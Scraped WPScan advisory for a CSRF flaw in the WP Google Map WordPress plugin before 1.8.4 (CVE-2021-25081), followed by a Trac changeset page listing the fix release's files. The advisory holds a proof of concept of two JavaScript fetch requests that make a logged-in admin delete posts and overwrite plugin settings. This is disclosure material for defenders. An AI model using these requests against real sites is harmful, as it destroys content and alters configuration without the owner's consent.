=== Content from wpscan.com_ea5b41fc_20250115_080110.html ===


[Skip to content](#wp--skip-link--target)

* [Features](https://a8cteam5105.wordpress.com/features/)
* [Pricing](https://a8cteam5105.wordpress.com/pricing/)
* Solutions
  + [Status](https://status.wpscan.com/)
  + [API Details](/api)
  + [CLI Scanner](https://a8cteam5105.wordpress.com/wordpress-cli-scanner/)
* Vulnerabilities
  + [Themes](/themes)
  + [WordPress](/wordpresses)
  + [Plugins](/plugins)
  + [Stats](/statistics)
  + [Submit Vulnerabilities](/submit)
  + [Leaderboard](/leaderboard)
* Resources
  + [Blog](/blog)
  + [Enterprise Features](https://a8cteam5105.wordpress.com/enterprise-customers-features/)
  + [How to Install WPScan](https://a8cteam5105.wordpress.com/how-to-install-wpscan/)
  + [WPScan Glossary](/wpscan-glossary)
  + [2024 Website Threat Report](https://wpscan.com/2023-website-threat-report/)

Search

## WordPress Plugin Vulnerabilities

# WP Google Map < 1.8.4 - Arbitrary Post Deletion and Plugin's Settings Update via CSRF

### Description

The plugin does not have CSRF checks in most of its AJAX actions, which could allow attackers to make logged in admins delete arbitrary posts and update the plugin's settings via a CSRF attack

### Proof of Concept

Removing post:
fetch("https://example.com/wp-admin/admin-ajax.php", {
"headers": {
"content-type": "application/x-www-form-urlencoded",
},
"body": "action=wpgmapembed\_remove\_wpgmap&post\_id=1",
"method": "POST",
"credentials": "include"
}).then(response => response.text())
.then(data => console.log(data));
Updating settings:
fetch("https://example.com/wp-admin/admin-ajax.php", {
"headers": {
"content-type": "application/x-www-form-urlencoded",
},
"body": "action=wpgmapembed\_save\_setup\_wizard&wgm\_api\_key=hohohoho&wgm\_language=999&wgm\_regional\_area=aaaaa",
"method": "POST",
"credentials": "include"
}).then(response => response.text())
.then(data => console.log(data));

### Affects Plugins

[![Plugin icon](https://s2.wp.com/wp-content/themes/a8c/wpscan/assets/img/plugin-icon.svg)

gmap-embed](https://a8cteam5105.wordpress.com/plugin/gmap-embed/)

![](https://s2.wp.com/wp-content/themes/a8c/wpscan/assets/img/checkmark-green-alt.svg)
Fixed in 1.8.4

### References

CVE
[CVE-2021-25081](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-25081)

URL
<https://plugins.trac.wordpress.org/changeset/2667376>

### Classification

Type
CSRF

OWASP top 10
[A2: Broken Authentication and Session Management](https://www.owasp.org/index.php/Top_10-2017_A2-Broken_Authentication)

CWE
[CWE-352](https://cwe.mitre.org/data/definitions/352.html)

CVSS
[5.4 (medium)](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:L)

### Miscellaneous

Original Researcher
Krzysztof Zając

Submitter
Krzysztof Zając

Submitter website
<https://kazet.cc/>

Verified
Yes

WPVDB ID
[f85cf258-1c2f-444e-91e5-b1fc55880f0e](https://a8cteam5105.wordpress.com/vulnerability/f85cf258-1c2f-444e-91e5-b1fc55880f0e/)

### Timeline

Publicly Published
2022-01-27 (about 2 years ago)

Added
2022-01-27 (about 2 years ago)

Last Updated
2022-04-09 (about 2 years ago)

### Other

Published
Title

Published
2024-03-28
Title
[WordPress Meta Data and Taxonomies Filter (MDTF) < 1.3.3.2 - Cross-Site Request Forgery](https://a8cteam5105.wordpress.com/vulnerability/5a426a51-f29f-48c7-87f3-d46223bb5b4b/)

Published
2022-01-24
Title
[Access Demo Importer < 1.0.8 - Data Reset via CSRF](https://a8cteam5105.wordpress.com/vulnerability/fd38b94c-cde8-448f-9d7b-f8272e5a8ba0/)

Published
2024-07-05
Title
[The Events Calendar < 6.5.1.5 - Cross-Site Request Forgery via action\_restore\_events](https://a8cteam5105.wordpress.com/vulnerability/dadc908f-e301-4326-abe2-11c1e4fe0c83/)

Published
2023-09-04
Title
[Leadster < 1.1.3 - Settings Update via CSRF](https://a8cteam5105.wordpress.com/vulnerability/d5a46760-be6f-4250-87da-11e0b6ff9250/)

Published
2022-02-16
Title
[Simple Quotation <= 1.3.2 - Quote Creation/Edition via CSRF to Stored Cross-Site Scripting](https://a8cteam5105.wordpress.com/vulnerability/f6e15a23-8f8c-47c2-8227-e277856d8251/)

![](https://wpscan.com/wp-content/uploads/2023/10/wpscan-logo-dark.png?w=246)

### Vulnerabilities

* [WordPress](/wordpresses)
* [Plugins](/plugins)
* [Themes](/themes)
* [Our Stats](https://a8cteam5105.wordpress.com/statistics/)
* [Submit vulnerabilities](https://a8cteam5105.wordpress.com/submit/)

#### About

* [How it works](/features)
* [Pricing](/pricing)
* [WordPress plugin](https://wordpress.org/plugins/wpscan/)
* [Blog](/blog)
* [Contact](/contact)

#### For Developers

* [Status](https://status.wpscan.com/)
* [API details](/api)
* [CLI scanner](/wordpress-cli-scanner)

#### Other

* [Privacy](https://automattic.com/privacy/)
* [Terms of service](/terms)
* [Submission terms](/submission-terms/)
* [Disclosure policy](/vulnerability-disclosure-policy)
* [Privacy Notice for California Users](https://automattic.com/privacy/#california-consumer-privacy-act-ccpa)

---

![](https://wpscan.com/wp-content/uploads/2023/08/frame-1323.png?w=48)

In partnership with [Jetpack](https://jetpack.com/)

* [GitHub](https://github.com/wpscanteam/wpscan/)
* [Twitter](https://twitter.com/_wpscan_)
* [Facebook](https://www.facebook.com/WPScan)

---

An

![](https://wpscan.com/wp-content/uploads/2023/08/autpmattic-logo.png?w=298)

endeavor

[Work With Us](https://automattic.com/work-with-us/)

[Press](https://automattic.com/press/)

* Subscribe
  Subscribed

  + [![](https://wpscan.com/wp-content/uploads/2023/08/cropped-83c25-favicon.png?w=50) WPScan](https://wpscan.com)

  Join 30,404 other subscribers

  Sign me up

  + Already have a WordPress.com account? [Log in now.](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fwpscan.com%252Fblog%252Funauthorized-plugin-installation-activation-in-hunk-companion%252F)
* Privacy
* + [![](https://wpscan.com/wp-content/uploads/2023/08/cropped-83c25-favicon.png?w=50) WPScan](https://wpscan.com)
  + Subscribe
    Subscribed
  + [Sign up](https://wordpress.com/start/)
  + [Log in](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fwpscan.com%252Fblog%252Funauthorized-plugin-installation-activation-in-hunk-companion%252F)
  + [Report this content](https://wordpress.com/abuse/?report_url=https://wpscan.com)
  + [View site in Reader](https://wordpress.com/read/feeds/156197069)
  + [Manage subscriptions](https://subscribe.wordpress.com/)
  + Collapse this bar

![](https://pixel.wp.com/b.gif?v=noscript)


=== Content from plugins.trac.wordpress.org_c392f242_20250115_080109.html ===


[Skip to content](#main)

[WordPress.org](https://wordpress.org/)

* [News](https://wordpress.org/news/)
* [Download & Extend](https://wordpress.org/download/)
  + [Get WordPress](https://wordpress.org/download/)
  + [Themes](https://wordpress.org/themes/)
  + [Patterns](https://wordpress.org/patterns/)
  + [Plugins](https://wordpress.org/plugins/)
  + [Mobile](https://wordpress.org/mobile/)
  + [Hosting](https://wordpress.org/hosting/)
  + [Openverse ↗︎](https://openverse.org/)
* [Learn](https://learn.wordpress.org/)
  + [Learn WordPress](https://learn.wordpress.org/)
  + [Documentation](https://wordpress.org/documentation/)
  + [Forums](https://wordpress.org/support/forums/)
  + [Developers](https://developer.wordpress.org/)
  + [WordPress.tv ↗︎](https://wordpress.tv/)
* [Community](https://make.wordpress.org/)
  + [Make WordPress](https://make.wordpress.org/)
  + [Photo Directory](https://wordpress.org/photos/)
  + [Five for the Future](https://wordpress.org/five-for-the-future/)
  + [WordCamp ↗︎](https://central.wordcamp.org/)
  + [Meetups ↗︎](https://www.meetup.com/pro/wordpress/)
  + [Job Board ↗︎](https://jobs.wordpress.net/)
* [About](https://wordpress.org/about/)
  + [About WordPress](https://wordpress.org/about/)
  + [Showcase](https://wordpress.org/showcase/)
  + [Enterprise](https://wordpress.org/enterprise/)
  + [Gutenberg ↗︎](https://wordpress.org/gutenberg/)
  + [WordPress Swag Store ↗︎](https://mercantile.wordpress.org/)
* [Get WordPress](https://wordpress.org/download/)

Search Trac

[Get WordPress](https://wordpress.org/download/)

## [Plugin Directory](//wordpress.org/plugins/)

Search:

* [Login](https://login.wordpress.org/?redirect_to=http%3A%2F%2Fplugins.trac.wordpress.org%2Fchangeset%2F2667376)

* [Timeline](/timeline)
* [View Tickets](/report)
* [Browse Source](/browser)

## Context Navigation

* ← [Previous Changeset](/changeset/2667375 "Changeset 2667375")
* [Next Changeset](/changeset/2667377 "Changeset 2667377") →

---

# Changeset 2667376

View differences
inline
side by side

Show
lines around each change

Show the changes in full context

Ignore:

Blank lines

Case changes

White space changes

Timestamp:
01/27/2022 05:10:59 PM
([3 years](/timeline?from=2022-01-27T17%3A10%3A59Z&precision=second "See timeline at 01/27/2022 05:10:59 PM") ago)

Author:
milonfci
Message:

New version 1.8.4 released with hot fix

Location:
[gmap-embed](/browser/gmap-embed?rev=2667376)
Files:

137 added
16 edited

* [tags/1.8.4](/browser/gmap-embed/tags/1.8.4?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/admin](/browser/gmap-embed/tags/1.8.4/admin?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/admin/assets](/browser/gmap-embed/tags/1.8.4/admin/assets?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/admin/assets/css](/browser/gmap-embed/tags/1.8.4/admin/assets/css?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/admin/assets/css/setup\_wizard.css](/browser/gmap-embed/tags/1.8.4/admin/assets/css/setup_wizard.css?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/admin/assets/css/wp-gmap-style-media-query.css](/browser/gmap-embed/tags/1.8.4/admin/assets/css/wp-gmap-style-media-query.css?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/admin/assets/css/wp-gmap-style.css](/browser/gmap-embed/tags/1.8.4/admin/assets/css/wp-gmap-style.css?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/admin/assets/images](/browser/gmap-embed/tags/1.8.4/admin/assets/images?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/admin/assets/images/gmap\_embed\_logo.jpg](/browser/gmap-embed/tags/1.8.4/admin/assets/images/gmap_embed_logo.jpg?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/admin/assets/images/live\_chat.png](/browser/gmap-embed/tags/1.8.4/admin/assets/images/live_chat.png?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/admin/assets/images/markers](/browser/gmap-embed/tags/1.8.4/admin/assets/images/markers?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/admin/assets/images/markers/1.png](/browser/gmap-embed/tags/1.8.4/admin/assets/images/markers/1.png?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/admin/assets/images/markers/2.png](/browser/gmap-embed/tags/1.8.4/admin/assets/images/markers/2.png?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/admin/assets/images/markers/default.png](/browser/gmap-embed/tags/1.8.4/admin/assets/images/markers/default.png?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/admin/assets/images/paypal.png](/browser/gmap-embed/tags/1.8.4/admin/assets/images/paypal.png?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/admin/assets/images/pro\_version.png](/browser/gmap-embed/tags/1.8.4/admin/assets/images/pro_version.png?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/admin/assets/js](/browser/gmap-embed/tags/1.8.4/admin/assets/js?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/admin/assets/js/common.js](/browser/gmap-embed/tags/1.8.4/admin/assets/js/common.js?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/admin/assets/js/geo\_based\_map\_create.js](/browser/gmap-embed/tags/1.8.4/admin/assets/js/geo_based_map_create.js?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/admin/assets/js/geo\_based\_map\_edit.js](/browser/gmap-embed/tags/1.8.4/admin/assets/js/geo_based_map_edit.js?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/admin/assets/js/localized\_script.js](/browser/gmap-embed/tags/1.8.4/admin/assets/js/localized_script.js?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/admin/assets/js/setup\_wizard.js](/browser/gmap-embed/tags/1.8.4/admin/assets/js/setup_wizard.js?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/admin/assets/js/tinymce\_keyup\_event.js](/browser/gmap-embed/tags/1.8.4/admin/assets/js/tinymce_keyup_event.js?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/admin/assets/js/wgm\_map\_crud.js](/browser/gmap-embed/tags/1.8.4/admin/assets/js/wgm_map_crud.js?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/admin/assets/js/wgm\_marker\_crud.js](/browser/gmap-embed/tags/1.8.4/admin/assets/js/wgm_marker_crud.js?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/admin/assets/third-party](/browser/gmap-embed/tags/1.8.4/admin/assets/third-party?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/admin/assets/third-party/datatables](/browser/gmap-embed/tags/1.8.4/admin/assets/third-party/datatables?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/admin/assets/third-party/datatables/css](/browser/gmap-embed/tags/1.8.4/admin/assets/third-party/datatables/css?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/admin/assets/third-party/datatables/css/jquery.dataTables.min.css](/browser/gmap-embed/tags/1.8.4/admin/assets/third-party/datatables/css/jquery.dataTables.min.css?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/admin/assets/third-party/datatables/images](/browser/gmap-embed/tags/1.8.4/admin/assets/third-party/datatables/images?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/admin/assets/third-party/datatables/images/sort\_asc.png](/browser/gmap-embed/tags/1.8.4/admin/assets/third-party/datatables/images/sort_asc.png?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/admin/assets/third-party/datatables/images/sort\_both.png](/browser/gmap-embed/tags/1.8.4/admin/assets/third-party/datatables/images/sort_both.png?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/admin/assets/third-party/datatables/images/sort\_desc.png](/browser/gmap-embed/tags/1.8.4/admin/assets/third-party/datatables/images/sort_desc.png?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/admin/assets/third-party/datatables/js](/browser/gmap-embed/tags/1.8.4/admin/assets/third-party/datatables/js?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/admin/assets/third-party/datatables/js/jquery.dataTables.min.js](/browser/gmap-embed/tags/1.8.4/admin/assets/third-party/datatables/js/jquery.dataTables.min.js?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/admin/assets/third-party/font-awesome](/browser/gmap-embed/tags/1.8.4/admin/assets/third-party/font-awesome?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/admin/assets/third-party/font-awesome/5](/browser/gmap-embed/tags/1.8.4/admin/assets/third-party/font-awesome/5?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/admin/assets/third-party/font-awesome/5/css](/browser/gmap-embed/tags/1.8.4/admin/assets/third-party/font-awesome/5/css?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/admin/assets/third-party/font-awesome/5/css/font-awesome.css](/browser/gmap-embed/tags/1.8.4/admin/assets/third-party/font-awesome/5/css/font-awesome.css?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/admin/assets/third-party/font-awesome/5/webfonts](/browser/gmap-embed/tags/1.8.4/admin/assets/third-party/font-awesome/5/webfonts?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/admin/assets/third-party/font-awesome/5/webfonts/fa-brands-400.eot](/browser/gmap-embed/tags/1.8.4/admin/assets/third-party/font-awesome/5/webfonts/fa-brands-400.eot?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/admin/assets/third-party/font-awesome/5/webfonts/fa-brands-400.svg](/browser/gmap-embed/tags/1.8.4/admin/assets/third-party/font-awesome/5/webfonts/fa-brands-400.svg?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/admin/assets/third-party/font-awesome/5/webfonts/fa-brands-400.ttf](/browser/gmap-embed/tags/1.8.4/admin/assets/third-party/font-awesome/5/webfonts/fa-brands-400.ttf?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/admin/assets/third-party/font-awesome/5/webfonts/fa-brands-400.woff](/browser/gmap-embed/tags/1.8.4/admin/assets/third-party/font-awesome/5/webfonts/fa-brands-400.woff?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/admin/assets/third-party/font-awesome/5/webfonts/fa-brands-400.woff2](/browser/gmap-embed/tags/1.8.4/admin/assets/third-party/font-awesome/5/webfonts/fa-brands-400.woff2?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/admin/assets/third-party/font-awesome/5/webfonts/fa-regular-400.eot](/browser/gmap-embed/tags/1.8.4/admin/assets/third-party/font-awesome/5/webfonts/fa-regular-400.eot?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/admin/assets/third-party/font-awesome/5/webfonts/fa-regular-400.svg](/browser/gmap-embed/tags/1.8.4/admin/assets/third-party/font-awesome/5/webfonts/fa-regular-400.svg?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/admin/assets/third-party/font-awesome/5/webfonts/fa-regular-400.ttf](/browser/gmap-embed/tags/1.8.4/admin/assets/third-party/font-awesome/5/webfonts/fa-regular-400.ttf?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/admin/assets/third-party/font-awesome/5/webfonts/fa-regular-400.woff](/browser/gmap-embed/tags/1.8.4/admin/assets/third-party/font-awesome/5/webfonts/fa-regular-400.woff?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/admin/assets/third-party/font-awesome/5/webfonts/fa-regular-400.woff2](/browser/gmap-embed/tags/1.8.4/admin/assets/third-party/font-awesome/5/webfonts/fa-regular-400.woff2?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/admin/assets/third-party/font-awesome/5/webfonts/fa-solid-900.eot](/browser/gmap-embed/tags/1.8.4/admin/assets/third-party/font-awesome/5/webfonts/fa-solid-900.eot?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/admin/assets/third-party/font-awesome/5/webfonts/fa-solid-900.svg](/browser/gmap-embed/tags/1.8.4/admin/assets/third-party/font-awesome/5/webfonts/fa-solid-900.svg?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/admin/assets/third-party/font-awesome/5/webfonts/fa-solid-900.ttf](/browser/gmap-embed/tags/1.8.4/admin/assets/third-party/font-awesome/5/webfonts/fa-solid-900.ttf?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/admin/assets/third-party/font-awesome/5/webfonts/fa-solid-900.woff](/browser/gmap-embed/tags/1.8.4/admin/assets/third-party/font-awesome/5/webfonts/fa-solid-900.woff?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/admin/assets/third-party/font-awesome/5/webfonts/fa-solid-900.woff2](/browser/gmap-embed/tags/1.8.4/admin/assets/third-party/font-awesome/5/webfonts/fa-solid-900.woff2?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/admin/assets/third-party/sweetalert2](/browser/gmap-embed/tags/1.8.4/admin/assets/third-party/sweetalert2?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/admin/assets/third-party/sweetalert2/css](/browser/gmap-embed/tags/1.8.4/admin/assets/third-party/sweetalert2/css?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/admin/assets/third-party/sweetalert2/css/sweetalert2.min.css](/browser/gmap-embed/tags/1.8.4/admin/assets/third-party/sweetalert2/css/sweetalert2.min.css?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/admin/assets/third-party/sweetalert2/js](/browser/gmap-embed/tags/1.8.4/admin/assets/third-party/sweetalert2/js?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/admin/assets/third-party/sweetalert2/js/sweetalert2.min.js](/browser/gmap-embed/tags/1.8.4/admin/assets/third-party/sweetalert2/js/sweetalert2.min.js?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/admin/includes](/browser/gmap-embed/tags/1.8.4/admin/includes?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/admin/includes/constant.php](/browser/gmap-embed/tags/1.8.4/admin/includes/constant.php?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/admin/includes/default.mo](/browser/gmap-embed/tags/1.8.4/admin/includes/default.mo?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/admin/includes/markers-icons.php](/browser/gmap-embed/tags/1.8.4/admin/includes/markers-icons.php?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/admin/includes/markers-settings.php](/browser/gmap-embed/tags/1.8.4/admin/includes/markers-settings.php?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/admin/includes/wgm\_messages\_viewer.php](/browser/gmap-embed/tags/1.8.4/admin/includes/wgm_messages_viewer.php?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/admin/includes/wpgmap\_create.php](/browser/gmap-embed/tags/1.8.4/admin/includes/wpgmap_create.php?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/admin/includes/wpgmap\_edit.php](/browser/gmap-embed/tags/1.8.4/admin/includes/wpgmap_edit.php?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/admin/includes/wpgmap\_how\_to\_use\_manuals.php](/browser/gmap-embed/tags/1.8.4/admin/includes/wpgmap_how_to_use_manuals.php?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/admin/includes/wpgmap\_installation\_manuals.php](/browser/gmap-embed/tags/1.8.4/admin/includes/wpgmap_installation_manuals.php?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/admin/includes/wpgmap\_list.php](/browser/gmap-embed/tags/1.8.4/admin/includes/wpgmap_list.php?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/admin/includes/wpgmap\_settings.php](/browser/gmap-embed/tags/1.8.4/admin/includes/wpgmap_settings.php?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/admin/includes/wpgmap\_setup\_wizard.php](/browser/gmap-embed/tags/1.8.4/admin/includes/wpgmap_setup_wizard.php?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/admin/includes/wpgmap\_support.php](/browser/gmap-embed/tags/1.8.4/admin/includes/wpgmap_support.php?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/admin/includes/wpgmap\_troubleshooting\_manuals.php](/browser/gmap-embed/tags/1.8.4/admin/includes/wpgmap_troubleshooting_manuals.php?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/appsero](/browser/gmap-embed/tags/1.8.4/appsero?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/appsero/src](/browser/gmap-embed/tags/1.8.4/appsero/src?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/appsero/src/Client.php](/browser/gmap-embed/tags/1.8.4/appsero/src/Client.php?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/appsero/src/Insights.php](/browser/gmap-embed/tags/1.8.4/appsero/src/Insights.php?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/appsero/src/License.php](/browser/gmap-embed/tags/1.8.4/appsero/src/License.php?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/appsero/src/Updater.php](/browser/gmap-embed/tags/1.8.4/appsero/src/Updater.php?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/autoload.php](/browser/gmap-embed/tags/1.8.4/autoload.php?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/gmap-embed.pot](/browser/gmap-embed/tags/1.8.4/gmap-embed.pot?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/gmap\_icon\_18.png](/browser/gmap-embed/tags/1.8.4/gmap_icon_18.png?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/includes](/browser/gmap-embed/tags/1.8.4/includes?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/includes/Classes](/browser/gmap-embed/tags/1.8.4/includes/Classes?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/includes/Classes/Bootstrap.php](/browser/gmap-embed/tags/1.8.4/includes/Classes/Bootstrap.php?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/includes/Classes/Database.php](/browser/gmap-embed/tags/1.8.4/includes/Classes/Database.php?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/includes/Classes/Migration.php](/browser/gmap-embed/tags/1.8.4/includes/Classes/Migration.php?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/includes/Classes/srmgmap\_widget.php](/browser/gmap-embed/tags/1.8.4/includes/Classes/srmgmap_widget.php?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/includes/Traits](/browser/gmap-embed/tags/1.8.4/includes/Traits?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/includes/Traits/ActionLinks.php](/browser/gmap-embed/tags/1.8.4/includes/Traits/ActionLinks.php?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/includes/Traits/ActivationHooks.php](/browser/gmap-embed/tags/1.8.4/includes/Traits/ActivationHooks.php?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/includes/Traits/AdminInitActions.php](/browser/gmap-embed/tags/1.8.4/includes/Traits/AdminInitActions.php?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/includes/Traits/AssetHandler.php](/browser/gmap-embed/tags/1.8.4/includes/Traits/AssetHandler.php?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/includes/Traits/CommonFunctions.php](/browser/gmap-embed/tags/1.8.4/includes/Traits/CommonFunctions.php?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/includes/Traits/Filters.php](/browser/gmap-embed/tags/1.8.4/includes/Traits/Filters.php?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/includes/Traits/InitActions.php](/browser/gmap-embed/tags/1.8.4/includes/Traits/InitActions.php?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/includes/Traits/MapCRUD.php](/browser/gmap-embed/tags/1.8.4/includes/Traits/MapCRUD.php?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/includes/Traits/MarkerCRUD.php](/browser/gmap-embed/tags/1.8.4/includes/Traits/MarkerCRUD.php?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/includes/Traits/MediaButtons.php](/browser/gmap-embed/tags/1.8.4/includes/Traits/MediaButtons.php?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/includes/Traits/Menu.php](/browser/gmap-embed/tags/1.8.4/includes/Traits/Menu.php?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/includes/Traits/Notice.php](/browser/gmap-embed/tags/1.8.4/includes/Traits/Notice.php?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/includes/Traits/PluginsLoadedActions.php](/browser/gmap-embed/tags/1.8.4/includes/Traits/PluginsLoadedActions.php?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/includes/Traits/Settings.php](/browser/gmap-embed/tags/1.8.4/includes/Traits/Settings.php?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/includes/Traits/SetupWizard.php](/browser/gmap-embed/tags/1.8.4/includes/Traits/SetupWizard.php?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/includes/helper.php](/browser/gmap-embed/tags/1.8.4/includes/helper.php?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/index.php](/browser/gmap-embed/tags/1.8.4/index.php?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/languages](/browser/gmap-embed/tags/1.8.4/languages?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/languages/default.mo](/browser/gmap-embed/tags/1.8.4/languages/default.mo?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/languages/default.po](/browser/gmap-embed/tags/1.8.4/languages/default.po?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/languages/gmap-embed-bn\_BD.mo](/browser/gmap-embed/tags/1.8.4/languages/gmap-embed-bn_BD.mo?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/languages/gmap-embed-bn\_BD.po](/browser/gmap-embed/tags/1.8.4/languages/gmap-embed-bn_BD.po?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/languages/gmap-embed-da\_DK.mo](/browser/gmap-embed/tags/1.8.4/languages/gmap-embed-da_DK.mo?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/languages/gmap-embed-da\_DK.po](/browser/gmap-embed/tags/1.8.4/languages/gmap-embed-da_DK.po?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/languages/gmap-embed-de\_DE.mo](/browser/gmap-embed/tags/1.8.4/languages/gmap-embed-de_DE.mo?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/languages/gmap-embed-de\_DE.po](/browser/gmap-embed/tags/1.8.4/languages/gmap-embed-de_DE.po?rev=2667376 "Show entry in browser")
  (added)
